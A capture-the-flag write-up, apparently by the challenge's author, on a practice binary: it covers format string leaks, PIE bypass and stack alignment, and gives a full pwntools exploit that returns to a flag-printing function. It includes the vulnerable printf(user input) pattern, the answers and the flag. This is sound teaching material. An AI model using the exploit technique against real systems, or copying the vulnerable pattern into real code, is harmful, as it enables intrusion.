So this project taught me a lot about authoring binex problems, which also gave me a even better understanding of it, so lets go over it. The idea of this project was to make a combination of the concepts we have done leading up to this point. The challenge starts with a little bit of reversing, and then finally using a format string vulnerability to leak an address to find the binary's base address. Finally, write a final payload to call the printme function, which gives you the flag. I give the C file in case we don't have the same libc version or if you need additional help, but the intention of this challenge is for you to figure it out with only the binary given to you. Before we even get into solving the problem, there are a few concepts that are important to understand before starting this challenge. Namely, what is a format string vulnerability, how does this get passed PIE, what is stack alignment and why does this challenge need it, then finally what is pwntools and why is it useful.

### Format String Vulnerability

Format string vulnerabilities are what they sound like, a vulnerability that involves format strings. To understand this vulnerability, it's also important to understand calling conventions. In 64 bit programs, the calling conventions are where you store values when you call a function. It will store values into registers for your irst few values and then put the rest onto the stack. The order foes edi. rsi. rdx.rcx. r8, r9 and then you start reading from the stack. So lets look at the most basic vulnerability to see how this works.

```bash
char string[];
scanf("%s",string)
printf(string)
```

You initialize a string and put into it input from the user. You then print directly what the user inputs. The problem with this is that printf will print out very literally what you want. If the user inputs the string "Hello", it will simply echo it back. However, if they put any format specifiers, printf will have no idea where to pull this from since you didn't give it a variable to interpret, so it will start pulling from first the registers from the order of the calling convention, and then will start reading values from the stack. This allows us to potentially, leak values off the stack to give us the ability to bypass PIE. You usually utilize this by spamming a lot of %p to get the memory locations  off the stack. You can then use the format %N$p to get exclusively what you think is a leaked address. You can then add this to your payload to actually bypass PIE which we will go over next.

### PIE

PIE (Position Independent Executable) is a protection for binaries that make it so you cannot hard code addresses into your exploit. Without PIE enabled, the function "main" for example will be at the same spot no matter how many times you run it. This allows you to just look up the symbol and find the address, and put it into your payload without any worries. With PIE enabled, main will now be at an offset from the base address of the binary, but the actual address of both will change. This is fairly hard to get around, but if you can cause a leak of an address from the stack, you can calculate the base address of the binary and then find any function you want from that. This is why having a format string vulnerability is so crucial for this problem, as we would have no idea how to get to "printme" without some kind of leak.

### Stack Alignment

This is something that may occur when solving a binary exploitation problem. If your exploit is not 16 byte aligned, sometimes the function you're trying to return to won't execute and just SIGSEV instead. This can be mitigated by a simply getting a ret gadget via ropper or ROPgadget and putting it right before you try to call your vulnerable function. If you feel as though you have everything right and your exploit doesn't work, trying to use this ret gadget to fix your stack alignment is a good first step.

### Pwn Tools

Pwn_tools is a library in python that is extremely important for binary exploitation. It has a lot of functions that can automatically pull symbols if the binary is not stripped, pack your bytes correctly, or even automatically make shellcode for you to put into your payload. It also allows you to send payloads to your program without having to run it and put the inputs in yourself. It's a very useful library to get familiar with if you want to get better at binary exploitation.

### Solution

So first, it's always important to look at the file properties by running file on it. Lets do that and see what we get.

```bash
fundamentals: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c8cf61818e0777ea8ea86a366acbde14b296fd7, for GNU/Linux 3.2.0, not stripped
```

We see that it is a ELF 64-bit executable, dynamically linked and that it is not stripped. We're most excited for the fact it is not stripped, this means we will have not problems finding the symbols for the file. Last important note, we see that pie is in fact enabled which we will have to work around. We will have to somehow leak some addresses to get around pie. Lets run a checksec as well.

```bash
└─$ checksec fundamentals
[*] '/home/shinigami/fundamentals'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

We also see that NX is enabled, so we cannot run any shellcode and that no canary is found, which means that the compiler didn't put one in there, but doesn't mean the developer didn't put on themselves. I like running the actual binary to see what we're up against, so lets see what it does.

![image.png](assets/images/writeups/12-week-project/image.png)

So, there's no buffer overflow here, but we have to find the developers favorite food. This is almost like a security question to access the main program. If the developer hard coded their favorite food, we should be able to reverse the program and see the string. Lets run radre2 on this binary and see if this works as expected. We would ideally be looking for some type of scanf or fgets and see what it compares our input to.

![image.png](assets/images/writeups/12-week-project/image-1.png)

We see that after the scanf at the top, it does in fact compare it directly to the string "Steak". We also see that it does another compare to the number "23". This means that theoretically, we should be able to just input these values and get past the first few checks from the program.

```bash
┌──(shinigami㉿shinigami)-[~]
└─$ ./fundamentals
What is my favorite food: Steak
What is my favorite number: 23
Give me some input: a
a
Overflow me:a
```

We successfully made it past the first two checks, now it seems to be taking in some input and then giving us a clear sign to overflow the final buffer. We still need to bypass pie, so lets see if we can put in a format string when it asks us for some input since it's printing back out our input.

```bash
└─$ ./fundamentals
What is my favorite food: Steak
What is my favorite number: 23
Give me some input: %p
0xa
Overflow me:a
```

This is good news, there's a format string vulnerability which allows us to leak addresses off of the stack. This will allow us to bypass PIE later in our exploit. Lets also verify that we indeed crash on the final input, "Overflow me".

```bash
└─$ ./fundamentals
What is my favorite food: Steak
What is my favorite number: 23
Give me some input: a
a
Overflow me:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Stack smashing detected
```

"Stack smashing detected" seems like a custom string, meaning that there is probably a custom canary put into the program. We will either have to find or leak this value and put it into our program. Lets see if this value is also hard coded in radare2.

![image.png](assets/images/writeups/12-week-project/image-2.png)

Luckily for us, it is a hard coded value, which is the hexdecimal value "0xdeadbeef". We should also make note of this when building our exploit later. Lets finally start running this program and start finding our offsets so we can get the flag. I will opt to use gef for this dynamic analysis, but gdb works just as well. Lets start by looking at all the functions we have in the program.

```bash
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  putchar@plt
0x0000000000001040  puts@plt
0x0000000000001050  printf@plt
0x0000000000001060  __isoc23_scanf@plt
0x0000000000001070  strcmp@plt
0x0000000000001080  fflush@plt
0x0000000000001090  exit@plt
0x00000000000010a0  __cxa_finalize@plt
0x00000000000010b0  _start
0x00000000000010e0  deregister_tm_clones
0x0000000000001110  register_tm_clones
0x0000000000001150  __do_global_dtors_aux
0x0000000000001190  frame_dummy
0x0000000000001199  printme
0x00000000000011ca  main
0x0000000000001330  _fini
```

Most of these are standard functions, the only two functions of note are printme and main. It's important to remember these offsets so we can calculate them in our exploit later. Lets break right after we give input to the final buffer.

```bash
0x00000000000012ff <+309>:	call   0x1060 <__isoc23_scanf@plt>
0x0000000000001304 <+314>:	cmp    DWORD PTR [rbp-0x4],0xdeadbeef
```

Disassembling main, we see that it is about at main+314, so we will break there.

```bash
gef➤  x/40wx $rsp
0x7fffffffe030:	0x00000000	0x61610000	0x61616161	0x61616161
0x7fffffffe040:	0x61616161	0x61616161	0x00000061	0x00000000
0x7fffffffe050:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe060:	0x00000017	0x74530000	0x006b6165	0xdeadbeef
0x7fffffffe070:	0xffffe188	0x00007fff	0xf7dd6f75	0x00007fff
0x7fffffffe080:	0xf7fc7000	0x00007fff	0x555551ca	0x00005555
0x7fffffffe090:	0xffffe170	0x00000001	0xffffe188	0x00007fff
0x7fffffffe0a0:	0x00000000	0x00000000	0x9d02db11	0x57800b06
0x7fffffffe0b0:	0x00000001	0x00000000	0xf7ffd000	0x00007fff
0x7fffffffe0c0:	0xffffe198	0x00007fff	0x55557dd8	0x00005555
gef➤  i f
Stack level 0, frame at 0x7fffffffe080:
 rip = 0x555555555304 in main; saved rip = 0x7ffff7dd6f75
 Arglist at 0x7fffffffe070, args:
 Locals at 0x7fffffffe070, Previous frame's sp is 0x7fffffffe080
 Saved registers:
  rbp at 0x7fffffffe070, rip at 0x7fffffffe078

```

Looking at this output, we see that our buffer starts writing at about 0x7fffffffe036 and our saved return address is locaed at 0x7fffffffe078. Doing some math, we see that our offset is 66 bytes. We also see that our canary value is located 54 bytes away from our input. This means our payload would look something like this, 54 + canary + 8 more bytes + address of printme. This is good, but we still have to bypass PIE somehow with our leak from before. The best way to do this is put a lot of %p until you find something that looks like a value. You then use %N$p to get the value of interest. After a little bit of fuzzing, you can find a value that looks like an address value at %17$p. You can take that value and then subtract it from the binary base address for the current execution cycle which would be the command p $_base(). Subtracting these two should eventually give you the offset "0x11ca". This means all we need to do is leak this value, subtract 0x11ca from it to get our binary base address, and then we can find the address of printme to return to it correctly. We now have all our components to solve this challenge. Lets walk through the components of the exploit script.

```bash
from pwn import *
elf = context.binary = ELF("./fundamentals")
p = process()
#gdb.attach(p, gdbscript="break *main+314")

offset = 0x11ca
payload1 = "Steak"
payload2 = "23"
p.send(payload1)
p.send(" ")

p.send(payload2)
p.send(" ")

payload3 = "%17$p"
p.send(payload3)
p.send(" ")

p.recvuntil("input:")

address = int(p.recvline().strip(),16)

#Find the offset of printme from binaddr
elf.address = address - offset
ret = elf.address + 0x1016
print(f"PIE base is {hex(elf.address)} and printme is at {hex(elf.sym['printme'])}")
#Find out how many bytes until canary and saved return address
canary = 0xdeadbeef
payload_final = b"A" * 54 + p32(canary) + b"A" * 8 + p64(ret) +  p64(elf.sym['printme'])
p.send(payload_final)
p.send(" ")
p.interactive()
```

We have to set the context of the binary so we can set certain stuff like the base address and then easily pull symbols after we set that later in the exploit. We have our answers from before like Steak and 23, we have to send spaces afterwards to simulate actually pressing enter. We then have to send our format string to get our leaked value and receive it into a variable address. We subtract the offset we calculated earlier to then find the base address, which will allow us to return to printme properly. We set our canary value and then construct our final payload, 54 bytes to get to our canary, make sure not to overwrite it, 8 more random bytes and ret gadget for stack alignment and finally the address of printme. We send it through and finally go to p.interactive() to ensure we see our flag being printed. Running this exploit should give us our flag finally.

### Flag

```bash
michel{you_have_won}
```

### Mitigation

You should never have a format string vulnerability in your program and should always check the size of any input from the user. You can never implicitly trust the user with their input, you must always check it. Also it would be really hard to compile a program this insecure in the modern age, as gcc will scream at you and treat these as errors you have to fix unless you pass certain flags for gcc to compile it anyways.